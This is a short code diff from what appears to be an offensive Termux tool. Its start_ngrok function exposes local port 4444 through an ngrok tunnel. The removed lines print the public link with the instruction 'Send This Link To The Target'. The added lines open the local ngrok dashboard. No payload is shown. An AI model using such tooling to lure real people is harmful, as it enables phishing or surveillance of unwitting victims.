@@ -65,10 +65,7 @@ def start_ngrok(path):
 			print(f"{yellow}Starting Ngrok Server ")
 			os.system("./ngrok http 4444 > /dev/null 2>&1 &")
 			os.system("sleep 5")
-			r=requests.get("http://localhost:4040/api/tunnels")
-			url=re.compile(r"https://\w*.ngrok.io")
-			url=url.findall(r.text)
-			print(f"{yellow}Send This Link To The Target: {green}{url[0]}")
+			os.system("termux-open-url https://localhost:4040")
 		else:
 			wget.download("https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
 			os.system("unzip ngrok*")
@@ -76,10 +73,7 @@ def start_ngrok(path):
 			print(f"{yellow}Starting Ngrok Server ")
 			os.system("./ngrok http 4444 > /dev/null 2>&1 &")
 			os.system("sleep 5")
-			r=requests.get("http://localhost:4040/api/tunnels")
-			url=re.compile(r"https://\w*.ngrok.io")
-			url=url.findall(r.text)
-			print(f"{yellow}Send This Link To The Target: {green}{url[0]}")
+			os.system("termux-open-url https://localhost:4040")
 	except:
 		print(f"{red}Please Open Your Hotspot Otherwise You Cann't get link ")
 
